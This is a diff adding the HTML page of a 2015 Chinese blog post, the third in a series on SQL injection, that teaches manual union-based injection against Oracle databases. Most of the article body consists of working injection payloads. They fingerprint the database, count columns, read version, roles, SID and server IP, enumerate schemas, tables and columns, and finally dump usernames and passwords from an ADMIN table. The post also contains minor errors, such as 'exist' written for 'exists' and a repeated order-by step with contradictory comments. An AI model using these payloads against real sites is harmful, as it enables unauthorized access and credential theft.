@@ -1,0 +1,652 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="博客名" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description" content="最后的sql注入类型了，就三种常见的数据库的手工注入的方法，分别得sqlserver mysql oracle这三种数据库
+oracle数据库oracle数据库作为当前最大的数据库，拥有了最快的查询速度和最规范的的数据库被很多大公司和中型公司使用，所以oracle是当前实用性最强的数据库，之所以oracle不被小公司使用因为   收费">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第一个里程碑:sql注入(三)">
+<meta property="og:url" content="http://95on.cn/2015/10/15/sql3md/index.html">
+<meta property="og:site_name" content="博客名">
+<meta property="og:description" content="最后的sql注入类型了，就三种常见的数据库的手工注入的方法，分别得sqlserver mysql oracle这三种数据库
+oracle数据库oracle数据库作为当前最大的数据库，拥有了最快的查询速度和最规范的的数据库被很多大公司和中型公司使用，所以oracle是当前实用性最强的数据库，之所以oracle不被小公司使用因为   收费">
+<meta property="og:updated_time" content="2016-11-05T13:04:38.781Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="第一个里程碑:sql注入(三)">
+<meta name="twitter:description" content="最后的sql注入类型了，就三种常见的数据库的手工注入的方法，分别得sqlserver mysql oracle这三种数据库
+oracle数据库oracle数据库作为当前最大的数据库，拥有了最快的查询速度和最规范的的数据库被很多大公司和中型公司使用，所以oracle是当前实用性最强的数据库，之所以oracle不被小公司使用因为   收费">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: 'Author'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://95on.cn/2015/10/15/sql3md/"/>
+
+  <title> 第一个里程碑:sql注入(三) | 博客名 </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">博客名</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle">追梦，钻研，努力</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                第一个里程碑:sql注入(三)
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Posted on</span>
+            <time itemprop="dateCreated" datetime="2015-10-15T20:02:25+08:00" content="2015-10-15">
+              2015-10-15
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/漏洞/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>最后的sql注入类型了，就三种常见的数据库的手工注入的方法，分别得sqlserver mysql oracle这三种数据库</p>
+<h2 id="oracle数据库"><a href="#oracle数据库" class="headerlink" title="oracle数据库"></a>oracle数据库</h2><p>oracle数据库作为当前最大的数据库，拥有了最快的查询速度和最规范的的数据库被很多大公司和中型公司使用，所以oracle是当前实用性最强的数据库，之所以oracle不被小公司使用因为   <strong>收费</strong><br><a id="more"></a></p>
+<h3 id="oracl的数据库的注入方法"><a href="#oracl的数据库的注入方法" class="headerlink" title="oracl的数据库的注入方法"></a>oracl的数据库的注入方法</h3><p>先去判断数据库的类型</p>
+<blockquote>
+<pre><code>and exist(select * from dual)
+and exist(select * from user_tables)
+</code></pre></blockquote>
+<p>dual这个表是oracle的系统表和user_tables都是 如果返回页面都正常那么肯定是oracl的数据库<br>1.我们依旧要用order by 去查询出字段的多少</p>
+<blockquote>
+<pre><code>order by 10-- 
+</code></pre></blockquote>
+<p> //错误,列数小于10</p>
+<blockquote>
+<pre><code>order by 3--    
+</code></pre></blockquote>
+<p>//正常,列数等于或大于3</p>
+<blockquote>
+<pre><code>order by 3--    
+</code></pre></blockquote>
+<p>//错误,列数小于4<br>2.判断字段类型  </p>
+<blockquote>
+<pre><code>.jsp?id=1 union select NULL,NULL,NULL from dual--   
+</code></pre></blockquote>
+<p>/<em>正常说明有3个字段</em>/</p>
+<blockquote>
+<pre><code>and 1=2 union select NULL,NULL,&apos;string&apos; from dual--    
+</code></pre></blockquote>
+<p>//正常,第三个字段是字符型<br>3.获取相关的重要信息  下列信息要放在你查询出来字段是字符串的位置 并且有的需要加上rownum=1的信息  在oracl里面我们的系统表和变量都是类似v$<br>数据库与版本 (SELECT banner FROM sys.v_$version WHERE ROWNUM=1)<br>当前用户权限 (SELECT * FROM session_roles)<br>数据库名 Select name From v$database<br>当前库所有表 Select table_name From all_tables<br>服务器系统   (select member from v$logfile where rownum=1)<br>服务器监听IP (select utl_inaddr.get_host_address from dual)<br>数据库SID   (select instance_name from v$instance)<br>4.我们获取所有数据库的名字</p>
+<blockquote>
+<pre><code>id=1 and 1=2 union select NULL,(select global_name from global_name),NULL from dual--
+
+id=1 and 1=2 union select NULL,(select sys.database_name from dual),NULL from dual--
+
+id=1 and 1=2 union select NULL,(select name from v$database),NULL from dual--
+</code></pre></blockquote>
+<p>这是获取当前库名的三种表达方式<br>第一个库名</p>
+<blockquote>
+<pre><code>id=1 and 1=2 union select NULL,(select owner from all_tables where rownum=1),NULL from dual--
+</code></pre></blockquote>
+<p>第二个库名</p>
+<blockquote>
+<pre><code>id=1 and 1=2 union select NULL,(select owner from all_tables where owner&lt;&gt;&apos;SYS&apos; and rownum=1),NULL from dual--
+</code></pre></blockquote>
+<p>第三个库名</p>
+<blockquote>
+<pre><code>id=1 and 1=2 union select NULL,(select owner from all_tables where owner&lt;&gt;&apos;SYS&apos; and owner&lt;&gt;&apos;SYSTEM&apos; and rownum=1),NULL from dual--
+</code></pre></blockquote>
+<p>因为rownum这个参数如果利用参数rownum=2的话不能查询出来 所以我们必须使用排除法来排除我们查到的相关表名和库名  </p>
+<p>查到的第一个是SYS，那么查第二个的时候就把SYS排除，比如第二个查出的是SYSTEM，那么第三个就排除前两个。<br>5.我们要去获取表名<br>当前表名</p>
+<blockquote>
+<pre><code>id=1 and 1=2 union select NULL,(select table_name from user_tables where rownum=1),NULL from dual--
+</code></pre></blockquote>
+<p>剩下的表名</p>
+<blockquote>
+<pre><code>id=1 and 1=2 union select NULL,(select table_name from user_tables where rownum=1 and table_name&lt;&gt;&apos;ADMIN&apos;),NULL from dual--
+</code></pre></blockquote>
+<p>使用&lt;&gt;’表名’不断添加要排除的表名查询，表名区分大小写。<br>6.获取表中字段名字<br>字段名</p>
+<blockquote>
+<pre><code>id=1 and 1=2 union select NULL,(select column_name from user_tab_columns where table_name=&apos;ADMIN&apos; and rownum=1),NULL from dual--
+
+id=1 and 1=2 union select NULL,(select column_name from user_tab_columns where table_name=&apos;ADMIN&apos; and rownum=1 and column_name&lt;&gt;&apos;ID&apos;),NULL from dual--
+
+id=1 and 1=2 union select NULL,(select column_name from user_tab_columns where table_name=&apos;ADMIN&apos; and rownum=1 and column_name&lt;&gt;&apos;USERNAME&apos; and column_name&lt;&gt;&apos;ID&apos;),NULL from dual--
+</code></pre></blockquote>
+<p>使用&lt;&gt;’字段名’不断添加要排除的字段名查询，字段名区分大小写。<br>7.查询字段数据 </p>
+<blockquote>
+<pre><code>id=1 and 1=2 union select NULL,USERNAME,PASSWORD from ADMIN—
+</code></pre><p>关于oracl如何上传shell 的方法  博主也没有办法  望大家可以努力思考</p>
+</blockquote>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2015/10/13/mysql/" rel="next" title="第一个里程碑:sql注入(二)">
+                <i class="fa fa-chevron-left"></i> 第一个里程碑:sql注入(二)
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2015/10/17/php/" rel="prev" title="data类型的url">
+                data类型的url <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="yours" />
+          <p class="site-author-name" itemprop="name">yours</p>
+          <p class="site-description motion-element" itemprop="description">博客</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">24</span>
+              <span class="site-state-item-name">posts</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              
+                <span class="site-state-item-count">4</span>
+                <span class="site-state-item-name">categories</span>
+              
+            </div>
+          
+
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#oracle数据库"><span class="nav-number">1.</span> <span class="nav-text">oracle数据库</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#oracl的数据库的注入方法"><span class="nav-number">1.1.</span> <span class="nav-text">oracl的数据库的注入方法</span></a></li></ol></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2016</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yours</span>
+</div>
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
